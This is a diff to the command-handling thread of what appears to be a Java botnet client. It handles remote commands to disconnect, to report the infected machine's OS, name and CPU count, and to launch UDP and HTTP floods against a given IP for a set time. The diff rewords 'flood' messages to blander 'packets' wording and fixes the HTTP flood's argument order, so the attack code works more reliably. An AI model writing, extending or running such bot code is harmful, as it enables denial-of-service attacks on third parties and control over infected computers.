@@ -55,6 +55,8 @@ public class CmdThread implements Runnable {
 		String[] split = str.split(":");
 		if(uc.isCmd(split)) {
 			String cmd = uc.getCmd(split);
+			//TODO: switch to modular system
+			
 			if(cmd.equals("die")) {
 				uc.getNetworkThread().disconnect();
 			
@@ -66,16 +68,14 @@ public class CmdThread implements Runnable {
 				uc.write(Settings.clientMutex);
 			
 			} else if(cmd.equals("info")) {
-				uc.write("»[OS]: " + uc.procOS(Client.os));
-				uc.write("\t\t»[NAME]: " + System.getenv("COMPUTERNAME"));
-				uc.write("\t\t»[CPU]: " + Runtime.getRuntime().availableProcessors() + " CORES");
+				uc.write("»[OS]: " + uc.procOS(Client.os) + " | " + System.getenv("COMPUTERNAME") + "-X" + Runtime.getRuntime().availableProcessors());
 			
 			} else if(cmd.equals("udp")) {
 				try {
 					String details = uc.getCmdTxt(split);
 					if(details.contains(" ")) {
 						String[] hsplit = details.split(" ");
-						uc.write("UDP flood initiated on " + hsplit[0] + " for " + hsplit[1] + " seconds.");
+						uc.write("UDP packets targeted at " + hsplit[0] + " for " + hsplit[1] + " seconds.");
 						PacketGen pg = new PacketGen();
 						pg.udp(hsplit[0], Integer.parseInt(hsplit[1]));
 						uc.write(pg.getUPacketCount() + " packets sent, total of " + pg.getLoad() + " KB.");
@@ -87,9 +87,12 @@ public class CmdThread implements Runnable {
 					String details = uc.getCmdTxt(split);
 					if(details.contains(" ")) {
 						String[] hsplit = details.split(" ");
-						uc.write("HTTP flood initiated on " + hsplit[0] + " for " + hsplit[1] + " at " + hsplit[2] + " delay.");
+						uc.write("HTTP packets initiated on " + hsplit[0] + " for " + hsplit[1] + " at " + hsplit[2] + " delay.");
 						PacketGen pg = new PacketGen();
-						pg.http(hsplit[0], Integer.parseInt(hsplit[2]), Integer.parseInt(hsplit[1]));
+						String ip = hsplit[0];
+						String time = hsplit[1];
+						String delay = hsplit[2];
+						pg.http(ip, Integer.parseInt(time), Integer.parseInt(delay));
 						uc.write(pg.getHConnCount() + " connections made to " + hsplit[0] + ".");
 					}
 				} catch (Exception httpError) { uc.write("Incorrect HTTP usage. "); httpError.printStackTrace(); }
